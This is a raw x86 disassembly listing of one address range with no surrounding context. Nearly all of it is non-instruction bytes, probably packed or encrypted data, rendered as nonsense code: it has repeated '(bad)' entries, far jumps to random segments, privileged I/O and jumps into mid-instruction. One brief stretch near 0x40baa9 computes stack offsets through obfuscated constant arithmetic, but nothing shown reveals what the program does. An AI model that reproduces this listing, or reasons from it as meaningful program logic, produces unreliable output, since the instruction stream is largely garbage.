  40b6a5:	or     eax,DWORD PTR [edi]
  40b6a7:	sbb    al,0x18
  40b6a9:	or     DWORD PTR [eax+ebp*4],ebx
  40b6ac:	mov    ds:0x78409e60,eax
  40b6b1:	xor    ch,bl
  40b6b3:	call   0xbec4:0x92bebeb7
  40b6ba:	mov    esi,0x8c808e0e
  40b6bf:	dec    esp
  40b6c0:	mov    cl,0x7d
  40b6c2:	inc    edi
  40b6c3:	es push ebx
  40b6c5:	sub    eax,0x3d3afb26
  40b6ca:	or     cl,BYTE PTR [ecx-0x57]
  40b6cd:	outs   dx,DWORD PTR ds:[esi]
  40b6ce:	in     eax,dx
  40b6cf:	lods   eax,DWORD PTR ds:[esi]
  40b6d0:	jecxz  0x40b67c
  40b6d2:	fnstcw WORD PTR [ebp+0x7a990c04]
  40b6d8:	test   esi,edx
  40b6da:	inc    edi
  40b6db:	mov    DWORD PTR ds:0x3826810e,ebp
  40b6e1:	mov    ch,bl
  40b6e3:	scas   al,BYTE PTR es:[edi]
  40b6e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6e5:	gs xchg edi,eax
  40b6e7:	and    DWORD PTR [ecx-0x1e9aa897],esp
  40b6ed:	iret   
  40b6ee:	popf   
  40b6ef:	jbe    0x40b67d
  40b6f1:	aad    0x3
  40b6f3:	sbb    DWORD PTR [edi-0x7e],0xd9c371d3
  40b6fa:	cmp    ecx,DWORD PTR [ebx-0x80]
  40b6fd:	in     al,0xd4
  40b6ff:	sar    esp,0xf
  40b702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b703:	aas    
  40b704:	aas    
  40b705:	push   0xd0bafc53
  40b70a:	or     bh,ch
  40b70c:	cwde   
  40b70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b70e:	stc    
  40b70f:	and    eax,0xbbe0ad14
  40b714:	stos   BYTE PTR es:[edi],al
  40b715:	ror    BYTE PTR [esi-0x35488bde],1
  40b71b:	inc    esp
  40b71c:	retf   
  40b71d:	xchg   ebx,eax
  40b71e:	add    BYTE PTR [esi-0x3b],cl
  40b721:	cmp    eax,0xae174121
  40b726:	mov    ds:0xcfc16e3d,al
  40b72b:	(bad)  
  40b72c:	bound  eax,QWORD PTR [esi+0x6bc871bb]
  40b732:	fdivr  QWORD PTR [eax]
  40b734:	inc    esi
  40b735:	hlt    
  40b736:	push   edi
  40b737:	adc    bl,BYTE PTR [eax-0x4c]
  40b73a:	mov    edx,0x90b65b0b
  40b73f:	(bad)  
  40b740:	mov    eax,DWORD PTR [eax]
  40b742:	inc    ebx
  40b743:	mov    ds:0x6910df36,al
  40b748:	ins    DWORD PTR es:[edi],dx
  40b749:	mov    DWORD PTR [ebx-0x7d],eax
  40b74c:	test   cl,bh
  40b74e:	dec    edx
  40b74f:	mov    ch,BYTE PTR [eax+0x65]
  40b752:	add    DWORD PTR [edx+0x3c],ebx
  40b755:	fst    QWORD PTR [esi]
  40b757:	stos   BYTE PTR es:[edi],al
  40b758:	xor    ebp,DWORD PTR [eax-0xe82072b]
  40b75e:	es push ds
  40b760:	bound  ecx,QWORD PTR [edi-0x333e7f99]
  40b766:	cli    
  40b767:	or     ebp,DWORD PTR [eax-0x35]
  40b76a:	dec    esi
  40b76b:	cmp    edx,0xffffffa7
  40b76e:	push   edi
  40b76f:	dec    eax
  40b770:	fadd   st,st(0)
  40b772:	dec    ebp
  40b773:	in     al,0xfb
  40b775:	jne    0x40b77b
  40b777:	fst    DWORD PTR [esi-0x48d235a]
  40b77d:	test   DWORD PTR [esi+0x1f],eax
  40b780:	sti    
  40b781:	imul   ebp,DWORD PTR [esi],0xb
  40b784:	inc    esp
  40b785:	sti    
  40b786:	icebp  
  40b787:	daa    
  40b788:	mov    bh,0x34
  40b78a:	outs   dx,DWORD PTR ds:[esi]
  40b78b:	arpl   WORD PTR [ecx*2+0x5025496b],dx
  40b792:	sbb    al,bl
  40b794:	dec    ecx
  40b795:	data16 gs mov bh,0xb7
  40b799:	ficom  DWORD PTR [ebp*2+0x35c1a440]
  40b7a0:	cmp    al,0x6f
  40b7a2:	gs xor edi,eax
  40b7a5:	adc    al,0x9f
  40b7a7:	int3   
  40b7a8:	pushf  
  40b7a9:	jmp    0x40b78a
  40b7ab:	inc    edi
  40b7ac:	fist   DWORD PTR [esi]
  40b7ae:	cmc    
  40b7af:	mov    al,ds:0x5498d684
  40b7b4:	pop    ds
  40b7b5:	fdiv   QWORD PTR [eax]
  40b7b7:	xchg   ebx,eax
  40b7b8:	push   0xa87ab384
  40b7bd:	pop    ds
  40b7be:	sar    DWORD PTR [ebx-0x4033df77],cl
  40b7c4:	jmp    0x40b772
  40b7c6:	pop    esi
  40b7c7:	pop    esi
  40b7c8:	pop    esi
  40b7c9:	push   es
  40b7ca:	shl    BYTE PTR [edx+edx*4+0x5d131b99],cl
  40b7d1:	fimul  DWORD PTR [eax-0x240691cd]
  40b7d7:	ja     0x40b82e
  40b7d9:	mov    ?,WORD PTR [esp+edx*8]
  40b7dc:	enter  0x23bd,0xf2
  40b7e0:	lock test BYTE PTR [eax],bl
  40b7e3:	push   esi
  40b7e4:	dec    BYTE PTR [esi+ebx*2]
  40b7e7:	mov    bl,0x56
  40b7e9:	jne    0x40b7b3
  40b7eb:	mov    ebx,0x807020b7
  40b7f0:	mov    cl,0x4a
  40b7f2:	or     esi,DWORD PTR [ebx]
  40b7f4:	push   0xffffffe2
  40b7f6:	jge    0x40b7a1
  40b7f8:	leave  
  40b7f9:	cmp    eax,DWORD PTR [ecx+edx*1]
  40b7fc:	cli    
  40b7fd:	mov    bh,0x3
  40b7ff:	neg    DWORD PTR [edi+0xff58fbb]
  40b805:	jecxz  0x40b848
  40b807:	xchg   ebp,eax
  40b808:	dec    DWORD PTR [edi]
  40b80a:	add    eax,0xb2594d92
  40b80f:	pop    edi
  40b810:	mov    cl,0xd4
  40b812:	arpl   WORD PTR [ebx+0x16],bp
  40b815:	xchg   BYTE PTR [eax+ecx*4+0x3c],dl
  40b819:	sbb    al,0x37
  40b81b:	and    bl,0xfa
  40b81e:	mov    al,ds:0x576034ab
  40b823:	and    al,0xb5
  40b825:	fwait
  40b826:	cmc    
  40b827:	or     eax,0xb98657b0
  40b82c:	outs   dx,BYTE PTR ds:[esi]
  40b82d:	or     dl,BYTE PTR [esi+ecx*8]
  40b830:	pushf  
  40b831:	and    DWORD PTR [edx-0x537b1d2a],esp
  40b837:	dec    eax
  40b838:	je     0x40b7e0
  40b83a:	fs ins DWORD PTR es:[edi],dx
  40b83c:	push   ss
  40b83d:	sar    BYTE PTR [ebp-0x11],1
  40b840:	rcr    BYTE PTR [edi+0x65bddf02],cl
  40b846:	push   edx
  40b847:	pop    eax
  40b848:	add    esp,edx
  40b84a:	(bad)  
  40b84b:	popa   
  40b84c:	inc    ebp
  40b84d:	clc    
  40b84e:	(bad)  
  40b84f:	xchg   BYTE PTR [edi+0x3b],dl
  40b852:	jmp    0xf595:0xfcc0c006
  40b859:	iret   
  40b85a:	outs   dx,BYTE PTR ds:[esi]
  40b85b:	fdiv   QWORD PTR [ecx+eiz*4+0x75985833]
  40b862:	sbb    al,0xe6
  40b864:	(bad)  
  40b865:	or     esp,DWORD PTR [esi+0x7d]
  40b868:	jae    0x40b80e
  40b86a:	inc    ebp
  40b86b:	ins    BYTE PTR es:[edi],dx
  40b86c:	cmc    
  40b86d:	xchg   esi,eax
  40b86e:	pop    ebp
  40b86f:	mov    cl,0x59
  40b871:	sar    DWORD PTR [edi+0x7df4b302],cl
  40b877:	dec    eax
  40b878:	cmp    DWORD PTR [edx-0x2e],ebp
  40b87b:	stc    
  40b87c:	jge    0x40b822
  40b87e:	repnz xchg edi,eax
  40b880:	push   esi
  40b881:	ins    DWORD PTR es:[edi],dx
  40b882:	xor    ecx,ecx
  40b884:	add    al,0xc4
  40b886:	inc    ecx
  40b887:	daa    
  40b888:	or     dl,BYTE PTR [esi-0x1b]
  40b88b:	and    esp,DWORD PTR [ebp-0x2a]
  40b88e:	sar    BYTE PTR [edi+0x1ef64a12],1
  40b894:	sub    al,BYTE PTR [edx+0x733e4afc]
  40b89a:	xor    al,0xfd
  40b89c:	jbe    0x40b858
  40b89e:	dec    edx
  40b89f:	dec    ebx
  40b8a0:	sar    ecx,cl
  40b8a2:	or     dh,BYTE PTR ds:0xb67b037d
  40b8a8:	inc    edi
  40b8a9:	fcomp  DWORD PTR ds:0x38fcb1c7
  40b8af:	inc    esp
  40b8b0:	mov    ah,0xa4
  40b8b2:	mov    bl,0xf6
  40b8b4:	int    0x6b
  40b8b6:	mov    al,ds:0xb4dba6e5
  40b8bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8bc:	js     0x40b8b9
  40b8be:	and    ebx,DWORD PTR [esi]
  40b8c0:	ret    
  40b8c1:	pop    ecx
  40b8c2:	(bad)  
  40b8c4:	outs   dx,BYTE PTR ds:[esi]
  40b8c5:	in     eax,dx
  40b8c6:	jmp    0x40b942
  40b8c8:	ds stos DWORD PTR es:[edi],eax
  40b8ca:	pop    ss
  40b8cb:	lods   eax,DWORD PTR ds:[esi]
  40b8cc:	fwait
  40b8cd:	es lahf 
  40b8cf:	add    ecx,DWORD PTR [eax-0x57]
  40b8d2:	lods   al,BYTE PTR ds:[esi]
  40b8d3:	cmp    BYTE PTR [esi+esi*4+0x512a7654],0x53
  40b8db:	mov    ds:0x94e51721,eax
  40b8e0:	mov    edx,0x9f8ed61
  40b8e5:	add    ecx,DWORD PTR [edx-0x5ff8cb6a]
  40b8eb:	xor    dh,BYTE PTR [esi+0x11433cb4]
  40b8f1:	int    0x14
  40b8f3:	ins    DWORD PTR es:[edi],dx
  40b8f4:	or     al,0xe8
  40b8f6:	xchg   ecx,eax
  40b8f7:	ins    BYTE PTR es:[edi],dx
  40b8f8:	repz out 0xeb,eax
  40b8fb:	aam    0xd4
  40b8fd:	out    0x62,eax
  40b8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b900:	call   0x9f44:0x8ed2ab79
  40b907:	sub    esp,DWORD PTR [ebp+eax*1+0x65868e5]
  40b90e:	add    bl,0x45
  40b911:	xchg   esp,eax
  40b912:	push   ds
  40b913:	retf   0xd6ef
  40b916:	stos   BYTE PTR es:[edi],al
  40b917:	(bad)  
  40b918:	or     BYTE PTR [edi-0x63eb32f6],0xac
  40b91f:	aaa    
  40b920:	mul    BYTE PTR [esi+0x3a477970]
  40b926:	outs   dx,BYTE PTR ds:[esi]
  40b927:	mov    dh,bh
  40b929:	dec    ebx
  40b92a:	pop    edi
  40b92b:	xor    DWORD PTR cs:[esi+eiz*8-0x295b1844],0xeda14c99
  40b937:	clc    
  40b938:	dec    esp
  40b939:	cmp    dl,bl
  40b93b:	outs   dx,BYTE PTR ds:[esi]
  40b93c:	xchg   DWORD PTR [eax],ebp
  40b93e:	inc    edi
  40b93f:	pusha  
  40b940:	mov    ds:0xdd0a0814,eax
  40b945:	dec    ebp
  40b946:	add    al,0x31
  40b948:	sbb    eax,0x26c0c05e
  40b94d:	rcl    BYTE PTR [ebp+0x42],cl
  40b950:	jl     0x40b914
  40b952:	dec    ebx
  40b953:	mov    cl,0x26
  40b955:	pop    ds
  40b956:	jne    0x40b9c5
  40b958:	ror    dl,0xd9
  40b95b:	pop    ebx
  40b95c:	adc    ch,BYTE PTR [eax]
  40b95e:	mov    al,ds:0x2f5941da
  40b963:	adc    DWORD PTR [eax],ebp
  40b965:	sti    
  40b966:	jmp    0xe5f9:0xa8f4b798
  40b96d:	shl    DWORD PTR [esi+0x59],0x3a
  40b971:	loop   0x40b9c9
  40b973:	xchg   ebp,eax
  40b974:	loop   0x40b9ab
  40b976:	jg     0x40b94f
  40b978:	lds    ecx,FWORD PTR [ebp-0x23]
  40b97b:	mov    cl,0x49
  40b97d:	or     edx,DWORD PTR [ebp+0x3e]
  40b980:	push   ecx
  40b981:	inc    ebp
  40b982:	push   es
  40b983:	jnp    0x40b946
  40b985:	push   es
  40b986:	xchg   edi,eax
  40b987:	dec    ecx
  40b988:	in     eax,0x3c
  40b98a:	push   eax
  40b98b:	mul    DWORD PTR [ebx+0x71d3bec2]
  40b991:	inc    ebp
  40b992:	mov    esp,0xe930fbe1
  40b997:	aam    0x92
  40b999:	cmp    BYTE PTR ds:0x2aa691f1,0xbd
  40b9a0:	push   ss
  40b9a1:	xchg   edi,eax
  40b9a2:	dec    esp
  40b9a3:	add    DWORD PTR [esi+0x2],esi
  40b9a6:	sahf   
  40b9a7:	cdq    
  40b9a8:	shl    BYTE PTR [esi+0xa736fb7],cl
  40b9ae:	mov    bl,BYTE PTR [ecx-0x77]
  40b9b1:	ins    BYTE PTR es:[edi],dx
  40b9b2:	pop    ds
  40b9b3:	add    eax,0xaa462024
  40b9b8:	leave  
  40b9b9:	(bad)  
  40b9ba:	mov    ebp,0xf99c520f
  40b9bf:	adc    eax,0xc1a31a8
  40b9c4:	push   ebx
  40b9c5:	xchg   ecx,eax
  40b9c6:	fsincos 
  40b9c8:	xor    ecx,esi
  40b9ca:	loopne 0x40b9ee
  40b9cc:	dec    esp
  40b9cd:	mov    ecx,DWORD PTR [ecx-0x15]
  40b9d0:	test   eax,0x3ee5aa69
  40b9d5:	retf   
  40b9d6:	(bad)  
  40b9d8:	sbb    ebx,DWORD PTR [ecx+eax*2]
  40b9db:	jg     0x40ba1a
  40b9dd:	outs   dx,DWORD PTR ds:[esi]
  40b9de:	add    edi,DWORD PTR [edi-0x12]
  40b9e1:	mov    dl,0xf5
  40b9e3:	cdq    
  40b9e4:	pop    esi
  40b9e5:	add    eax,0x55387b33
  40b9ea:	fcomip st,st(2)
  40b9ec:	push   eax
  40b9ed:	xchg   bh,dh
  40b9ef:	rsqrtps xmm3,XMMWORD PTR [ebx+0x13]
  40b9f3:	outs   dx,BYTE PTR ds:[esi]
  40b9f4:	hlt    
  40b9f5:	adc    ebx,DWORD PTR [eax]
  40b9f7:	sbb    al,BYTE PTR [ecx]
  40b9f9:	add    al,0xb5
  40b9fb:	xor    al,0xa7
  40b9fd:	gs mov dl,0x2f
  40ba00:	and    ch,dl
  40ba02:	mov    ch,0xaf
  40ba04:	stos   DWORD PTR es:[edi],eax
  40ba05:	in     eax,dx
  40ba06:	or     edi,esp
  40ba08:	cld    
  40ba09:	es (bad) 
  40ba0b:	adc    eax,0xa91adf39
  40ba10:	in     al,dx
  40ba11:	arpl   WORD PTR [ebx],cx
  40ba13:	test   al,0xc0
  40ba15:	adc    DWORD PTR [esi+0x45],ebx
  40ba18:	das    
  40ba19:	mov    cl,0x6f
  40ba1b:	sbb    eax,esi
  40ba1d:	fwait
  40ba1e:	scas   eax,DWORD PTR es:[edi]
  40ba1f:	out    0x9a,eax
  40ba21:	dec    ebx
  40ba22:	xor    al,0x84
  40ba24:	stos   DWORD PTR es:[edi],eax
  40ba25:	sub    ah,BYTE PTR [ebp+0x4ef110fc]
  40ba2b:	daa    
  40ba2c:	int    0xfd
  40ba2e:	add    DWORD PTR [eax+0x26374f71],0x796d305
  40ba38:	mov    esi,0xaeda7132
  40ba3d:	(bad)  [edx+ebx*1-0x278b7ce7]
  40ba44:	dec    esi
  40ba45:	inc    eax
  40ba46:	cwde   
  40ba47:	jmp    0x70de:0xec8a0370
  40ba4e:	fst    DWORD PTR [edx-0x38e2c18d]
  40ba54:	ins    DWORD PTR es:[edi],dx
  40ba55:	rcl    DWORD PTR [ebx],0x81
  40ba58:	lods   al,BYTE PTR ds:[esi]
  40ba59:	sti    
  40ba5a:	lods   al,BYTE PTR ds:[esi]
  40ba5b:	mov    al,0x90
  40ba5d:	clc    
  40ba5e:	dec    edx
  40ba5f:	aas    
  40ba60:	jecxz  0x40ba5a
  40ba62:	push   0x8d997e4a
  40ba67:	shl    dl,0xb7
  40ba6a:	fadd   QWORD PTR [edi-0x34375a0]
  40ba70:	dec    eax
  40ba71:	push   eax
  40ba72:	mov    esi,0x792d3408
  40ba77:	xor    al,0x27
  40ba79:	push   esi
  40ba7a:	push   esi
  40ba7b:	(bad)
  40ba7e:	mov    ds:0xbaf262a6,al
  40ba83:	or     cl,BYTE PTR [edx-0x3]
  40ba86:	(bad)  
  40ba87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba88:	mov    eax,0x9a19ce32
  40ba8d:	into   
  40ba8e:	ud0    esi,DWORD PTR [ebx+0x1182554d]
  40ba95:	(bad)  [esi]
  40ba97:	pop    esp
  40ba98:	leave  
  40ba99:	add    DWORD PTR [eax+0x75],eax
  40ba9c:	xchg   edx,eax
  40ba9d:	mov    dl,0x91
  40ba9f:	adc    DWORD PTR gs:[ecx-0x70],edx
  40baa3:	gs daa 
  40baa5:	rol    bh,0xc7
  40baa8:	in     al,dx
  40baa9:	mov    DWORD PTR [ebp-0x4],0x61c2
  40bab0:	mov    eax,DWORD PTR [ebp-0x4]
  40bab3:	mov    ecx,DWORD PTR [ebp-0x8]
  40bab6:	add    eax,0x1ca5
  40babb:	or     eax,ecx
  40babd:	mov    ecx,DWORD PTR ds:0x422708
  40bac3:	lea    eax,[eax+ecx*1-0x7eef]
  40baca:	mov    DWORD PTR [ebp-0x5c],eax
  40bacd:	mov    DWORD PTR [ebp-0x4],0x8ea
  40bad4:	mov    DWORD PTR [ebp-0x8],0x5759
  40badb:	mov    eax,DWORD PTR [ebp-0x8]
  40bade:	mov    ecx,DWORD PTR [ebp-0x4]
  40bae1:	and    eax,0x27f6
  40bae6:	xor    eax,ecx
  40bae8:	mov    ecx,DWORD PTR ds:0x42283c
  40baee:	imul   eax,eax,0x18
  40baf1:	xor    eax,0x17970
  40baf6:	lea    eax,[ebp+eax*1-0x54]
  40bafa:	mov    DWORD PTR [eax],ecx
  40bafc:	jmp    0x40bf07
  40bb01:	retf   0xf4e7
  40bb04:	leave  
  40bb05:	hlt    
  40bb06:	fsincos 
  40bb08:	out    0xad,eax
  40bb0a:	and    dl,BYTE PTR [edx-0x62]
  40bb0d:	imul   DWORD PTR [ebx-0x41]
  40bb10:	iret   
  40bb11:	outs   dx,BYTE PTR ds:[esi]
  40bb12:	mov    edi,0xc492bebe
  40bb17:	mov    esi,0xc4446ebe
  40bb1c:	ret    
  40bb1d:	xor    ebp,DWORD PTR [esi+eax*8+0x468cdc3b]
  40bb24:	jg     0x40bb84
  40bb26:	add    al,0x5f
  40bb28:	sub    edx,DWORD PTR [ebp-0x3c]
  40bb2b:	andps  xmm5,xmm7
  40bb2e:	cmp    dl,BYTE PTR [ebx+0x27]
  40bb31:	dec    eax
  40bb32:	cwde   
  40bb33:	lea    esi,[ebp+0x7280ee39]
  40bb39:	gs adc al,0xe8
  40bb3c:	mov    dl,0x3c
  40bb3e:	or     dh,dh
  40bb40:	pop    es
  40bb41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb42:	int3   
  40bb43:	pop    edx
  40bb44:	ret    0x21ff
  40bb47:	pop    es
  40bb48:	dec    ebx
  40bb49:	not    BYTE PTR [esi-0x2f]
  40bb4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb4d:	adc    DWORD PTR ds:0xe64a601e,ecx
  40bb53:	jmp    0x33b7:0xb1d6bf4
  40bb5a:	fadd   QWORD PTR [edi+0x25396aa5]
  40bb60:	mov    al,0xa8
  40bb62:	cmp    dl,al
  40bb64:	ja     0x40bb25
  40bb66:	aas    
  40bb67:	inc    esp
  40bb68:	cmp    edi,DWORD PTR [edi-0x2eeb21a9]
  40bb6e:	repz push 0x14f9c933
  40bb74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb75:	shr    BYTE PTR [eax-0xb],cl
  40bb78:	(bad)  
  40bb79:	or     eax,0x6198a041
  40bb7e:	fsubr  QWORD PTR [esi]
  40bb80:	or     eax,0x782a5f1
  40bb85:	and    eax,0x6e14c07e
  40bb8a:	mov    es,WORD PTR [edi+0x4a]
  40bb8d:	call   0xa745:0xb0690ac7
  40bb94:	mov    eax,ds:0x350bf63d
  40bb99:	lods   eax,DWORD PTR ds:[esi]
  40bb9a:	shl    DWORD PTR [edi+ebp*8],cl
  40bb9d:	shl    ebx,0xce
  40bba0:	push   0xda653e8d
  40bba5:	xchg   DWORD PTR [edi-0x7a9d34b1],ebp
  40bbab:	sbb    BYTE PTR [ebx],bh
  40bbad:	idiv   BYTE PTR [esi+0x31]
  40bbb0:	inc    esi
  40bbb1:	into   
  40bbb2:	mov    dh,0xa7
  40bbb4:	xor    al,0x5b
  40bbb6:	nop
  40bbb7:	les    ebx,FWORD PTR [esi]
  40bbb9:	cli    
  40bbba:	lods   al,BYTE PTR ds:[esi]
  40bbbb:	dec    esi
  40bbbc:	out    0xcd,al
  40bbbe:	push   ecx
  40bbbf:	aas    
  40bbc0:	(bad)  
  40bbc1:	shl    BYTE PTR [ebx],1
  40bbc3:	fwait
  40bbc4:	cmp    al,0xa0
  40bbc6:	(bad)  
  40bbc7:	jmp    0x5561:0x2497c8a8
  40bbce:	inc    edi
  40bbcf:	mov    esi,0x5f970c9a
  40bbd4:	loope  0x40bc2b
  40bbd6:	or     BYTE PTR [ebx+eax*8],ch
  40bbd9:	pop    edx
  40bbda:	jl     0x40bb9e
  40bbdc:	push   es
  40bbdd:	adc    edi,edi
  40bbdf:	dec    esi
  40bbe0:	xor    bl,BYTE PTR [ebx]
  40bbe2:	jge    0x40bc35
  40bbe4:	push   cs
  40bbe5:	div    ebx
  40bbe7:	push   edi
  40bbe8:	jns    0x40bbff
  40bbea:	push   eax
  40bbeb:	adc    dl,BYTE PTR [ecx]
  40bbed:	inc    edi
  40bbee:	jmp    0x52046c5d
  40bbf3:	mov    ds:0xfbeb442a,eax
  40bbf8:	and    al,0xa5
  40bbfa:	(bad)  
  40bbfb:	dec    eax
  40bbfc:	sbb    ch,BYTE PTR [eax-0x692386d0]
  40bc02:	mov    bh,0xb2
  40bc04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc05:	add    al,0x0
  40bc07:	adc    eax,0xca8547fd
  40bc0c:	fwait
  40bc0d:	stos   BYTE PTR es:[edi],al
  40bc0e:	cwde   
  40bc0f:	aas    
  40bc10:	jmp    0x40bc11
  40bc12:	in     eax,dx
  40bc13:	das    
  40bc14:	xor    eax,0x1255da5c
  40bc19:	mov    edi,0x2ba9e2d8
  40bc1e:	xchg   edi,eax
  40bc1f:	add    esp,DWORD PTR [ebx+0x4a]
  40bc22:	cmp    al,0xec
  40bc24:	das    
  40bc25:	es adc eax,0xbf5b367b
  40bc2b:	and    eax,0x16863fac
  40bc30:	or     dl,0x44
  40bc33:	add    al,BYTE PTR [edx+ecx*4+0x9]
  40bc37:	mov    ah,0x2a
  40bc39:	mov    ecx,0xe05f7e
  40bc3e:	and    eax,0x4e13a49a
  40bc43:	in     al,0x18
  40bc45:	cwde   
  40bc46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc47:	(bad)  
  40bc48:	or     dh,BYTE PTR [ecx]
  40bc4a:	sbb    ch,BYTE PTR [esi]
  40bc4c:	es push ds
  40bc4e:	rol    BYTE PTR [edi+edx*4-0x20],1
  40bc52:	dec    esi
  40bc53:	pop    edx
  40bc54:	icebp  
  40bc55:	pop    esi
  40bc56:	add    ch,BYTE PTR [esi-0x3f87ffad]
  40bc5c:	push   ecx
  40bc5d:	xor    al,0xcb
  40bc5f:	push   esi
  40bc60:	lds    esi,FWORD PTR [ebx+edx*2+0xa3f809]
  40bc67:	push   0xffffffaa
  40bc69:	data16 outs dx,BYTE PTR ds:[esi]
  40bc6b:	sub    ebx,DWORD PTR [esi+edx*2+0xadadb89]
  40bc72:	or     ah,dl
  40bc74:	int3   
  40bc75:	push   ebp
  40bc76:	int3   
  40bc77:	(bad)  [ebx-0x80]
  40bc7a:	pop    es
  40bc7b:	xchg   esp,eax
  40bc7c:	push   ecx
  40bc7d:	jne    0x40bcdc
  40bc7f:	push   ebp
  40bc80:	cdq    
  40bc81:	cwde   
  40bc82:	xchg   ecx,eax
  40bc83:	push   eax
  40bc84:	dec    BYTE PTR [eax+0x60595cb4]
  40bc8a:	jecxz  0x40bca7
  40bc8c:	mov    esi,0xd9b3a0df
  40bc91:	mov    ah,dl
  40bc93:	aam    0x69
  40bc95:	jge    0x43737982
  40bc9b:	sbb    BYTE PTR [ebx],dl
  40bc9d:	call   0x56639b12
  40bca2:	jmp    0x40bc95
  40bca4:	sbb    ch,cl
  40bca6:	mov    esp,0xb709962e
  40bcab:	in     eax,0x1
  40bcad:	inc    ecx
  40bcae:	and    al,0xf9
  40bcb0:	ret    0x7a89
  40bcb3:	repz loope 0x40bc5d
  40bcb6:	push   ss
  40bcb7:	les    eax,FWORD PTR [eax-0x34aa3e2e]
  40bcbd:	jbe    0x40bc76
  40bcbf:	shr    BYTE PTR [edx],cl
  40bcc1:	mov    eax,ds:0x1446ac24
  40bcc6:	call   DWORD PTR [ebx+0x4f]
  40bcc9:	mov    edi,0x8cb18601
  40bcce:	sbb    BYTE PTR [ebp-0x60],al
  40bcd1:	mov    ch,0x81
  40bcd3:	aad    0xdc
  40bcd5:	je     0x40bcc5
  40bcd7:	imul   ecx,DWORD PTR [ecx+0x686bed60],0x61
  40bcde:	in     al,dx
  40bcdf:	gs cmp al,0xf
  40bce2:	mov    BYTE PTR [edx],ah
  40bce4:	and    al,0xa0
  40bce6:	pop    edx
  40bce7:	iret   
  40bce8:	shl    edx,cl
  40bcea:	rcr    bl,0xf
  40bced:	cmp    eax,0xc06bf0a3
  40bcf2:	sub    al,0x77
  40bcf4:	add    BYTE PTR [ecx-0x1e7b0dae],al
  40bcfa:	scas   eax,DWORD PTR es:[edi]
  40bcfb:	cvtps2pd xmm6,xmm7
  40bcfe:	dec    edx
  40bcff:	jl     0x40bcb6
  40bd01:	inc    esp
  40bd02:	iret   
  40bd03:	das    
  40bd04:	push   edi
  40bd05:	jg     0x40bd82
  40bd07:	ror    DWORD PTR [ecx],cl
  40bd09:	imul   eax,DWORD PTR [esi+ebx*1-0x214f0f58],0xb59d8c31
  40bd14:	lock push es
  40bd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd17:	mov    dh,0xd6
  40bd19:	push   edi
  40bd1a:	mov    DWORD PTR [ecx+eax*1+0x2cb401d7],esi
  40bd21:	ss jge 0x40bd18
  40bd24:	sub    al,BYTE PTR [ecx+0x486ff8a5]
  40bd2a:	mov    bl,al
  40bd2c:	hlt    
  40bd2d:	pusha  
  40bd2e:	xor    edi,DWORD PTR [ecx]
  40bd30:	jne    0x40bcdf
  40bd32:	or     eax,0x5c473917
  40bd37:	jle    0x40bd7e
  40bd39:	dec    esp
  40bd3a:	adc    dl,BYTE PTR [ebx-0x20]
  40bd3d:	mov    ds:0x1f1020a0,al
  40bd42:	mov    edx,0x86e4ed18
  40bd47:	jns    0x40bd17
  40bd49:	inc    edi
  40bd4a:	dec    eax
  40bd4b:	pop    esp
  40bd4c:	pop    esp
  40bd4d:	push   es
  40bd4e:	pop    edx
  40bd4f:	adc    bh,0xa1
  40bd52:	mov    esi,0x8cdd707c
  40bd57:	fistp  DWORD PTR [edx-0x1675d3e1]
  40bd5d:	xchg   esp,eax
  40bd5e:	in     al,dx
  40bd5f:	in     al,0x13
  40bd61:	jno    0x40bd0e
  40bd63:	xchg   esp,eax
  40bd64:	sub    DWORD PTR ds:0xb353703f,0xffffffe6
  40bd6b:	dec    ebx
  40bd6c:	stc    
  40bd6d:	add    al,0x14
  40bd6f:	test   al,0x49
  40bd71:	or     BYTE PTR [ecx],dh
  40bd73:	stos   DWORD PTR es:[edi],eax
  40bd74:	sar    bl,cl
  40bd76:	rol    BYTE PTR [edi],cl
  40bd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd79:	add    ah,BYTE PTR [ebp+0x72]
  40bd7c:	test   BYTE PTR [edx-0x46aa3ebb],dh
  40bd82:	cmp    WORD PTR [esi+ebp*8],dx
  40bd86:	inc    esp
  40bd87:	add    ebx,ebp
  40bd89:	jecxz  0x40bd87
  40bd8b:	stc    
  40bd8c:	adc    al,0x6e
  40bd8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd8f:	or     esp,DWORD PTR [ecx-0x6d5743a9]
  40bd95:	cmp    eax,edx
  40bd97:	adc    cl,dh
  40bd99:	call   0x4ccc9da4
  40bd9e:	ret    0xf744
  40bda1:	sub    cl,BYTE PTR [eax-0x1727bd0e]
  40bda7:	ret    0xbb2e
  40bdaa:	fisttp QWORD PTR [ecx]
  40bdac:	cmp    edx,DWORD PTR [ecx-0x65e5a0a8]
  40bdb2:	cmc    
  40bdb3:	dec    esp
  40bdb4:	fild   QWORD PTR [edi-0x31]
  40bdb7:	ja     0x40bda0
  40bdb9:	jb     0x40bdcc
  40bdbb:	out    dx,al
  40bdbc:	pop    eax
  40bdbd:	cdq    
  40bdbe:	jne    0x40bdf0
  40bdc0:	dec    ebx
  40bdc1:	loop   0x40be2d
  40bdc3:	outs   dx,DWORD PTR ds:[esi]
  40bdc4:	iret   
  40bdc5:	shr    dh,cl
  40bdc7:	data16 jecxz 0x40bd99
  40bdca:	sahf   
  40bdcb:	mov    ebx,0x9409523f
  40bdd0:	or     BYTE PTR [eax],dl
  40bdd2:	or     esi,ecx
  40bdd4:	lods   eax,DWORD PTR ds:[esi]
  40bdd5:	xchg   esp,eax
  40bdd6:	dec    ecx
  40bdd7:	push   DWORD PTR [eax]
  40bdd9:	mov    cl,0x2b
  40bddb:	neg    DWORD PTR [edi+0x3e]
  40bdde:	push   es
  40bddf:	push   0x5c
  40bde1:	and    al,0x18
  40bde3:	push   ds
  40bde4:	dec    esi
  40bde5:	out    dx,eax
